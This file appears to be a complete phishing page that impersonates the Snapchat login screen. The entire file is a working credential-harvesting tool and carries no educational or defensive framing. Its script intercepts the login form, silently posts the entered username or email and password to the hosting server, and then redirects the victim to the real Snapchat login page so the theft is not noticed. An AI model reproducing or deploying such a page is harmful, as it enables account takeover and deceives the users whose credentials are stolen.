<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Snapchat - Log In</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Avenir Next',Avenir,'Helvetica Neue',Helvetica,Arial,sans-serif;background:#fffc00}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:white;border-radius:20px;padding:40px;width:380px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.1)}.logo{margin-bottom:30px;font-size:36px;font-weight:900;color:#000}.logo span{background:#fffc00;padding:4px 12px;border-radius:8px}input{width:100%;padding:14px;background:#f5f5f5;border:2px solid transparent;border-radius:12px;font-size:16px;margin-bottom:12px;outline:none}input:focus{background:white;border-color:#fffc00}input[type="submit"]{background:#000;color:#fffc00;border:none;font-weight:700;font-size:16px;cursor:pointer}input[type="submit"]:hover{background:#333}.link{color:#666;font-size:14px;margin-top:16px}.link a{color:#000;text-decoration:none;font-weight:600}</style></head><body><div class="container"><div class="box"><div class="logo"><span>Snapchat</span></div><form method="POST"><input type="text"name="username"placeholder="Username or Email"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Log In"></form><div class="link">New to Snapchat? <a href="#">Sign Up</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://accounts.snapchat.com/accounts/v2/login';});});</script></body></html>
